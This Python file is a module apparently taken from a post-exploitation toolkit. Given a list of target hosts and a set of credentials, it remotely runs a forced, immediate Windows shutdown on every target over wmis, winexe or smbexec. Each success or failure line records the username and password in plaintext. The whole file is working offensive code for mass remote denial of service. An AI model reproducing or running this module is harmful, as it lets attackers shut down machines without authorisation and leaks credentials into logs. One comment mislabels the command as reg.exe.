"""

Force a system shutdown.

Module built by @harmj0y

"""

from lib import command_methods

class Module:
    
    def __init__(self, targets=None, creds=None, args=None):
        
        self.name = "Force Shutdown"
        self.description = "Causes a host to shutdown immediately."

        # internal list() that holds one or more targets 
        self.targets = targets

        # internal list() that holds one or more cred tuples
        #   [ (username, pw), (username2, pw2), ...]
        self.creds = creds

        # a state output file that will be written out by pillage.py
        #   ex- if you're querying domain users
        self.output = ""

        # user interaction for- format is {Option : [Value, Description]]}
        self.required_options = {"trigger_method" : ["wmis", "[wmis], [winexe], or [smbexec] for triggering"]}
        
    def run(self):

        # assume single set of credentials
        username, password = self.creds[0]

        triggerMethod = self.required_options["trigger_method"][0]

        for target in self.targets:
            
            # reg.exe command to shutdown a machine immediately
            command = "shutdown -t 0 -s -f"
            result = command_methods.executeCommand(target, username, password, command, triggerMethod)

            if "success" in result:
                self.output += "[*] Shutdown command successfully triggered using creds '"+username+":"+password+"' on : " + target + "\n"
            else:
                self.output += "[!] Shutdown command unsuccessful using creds '"+username+":"+password+"' on : " + target + "\n"
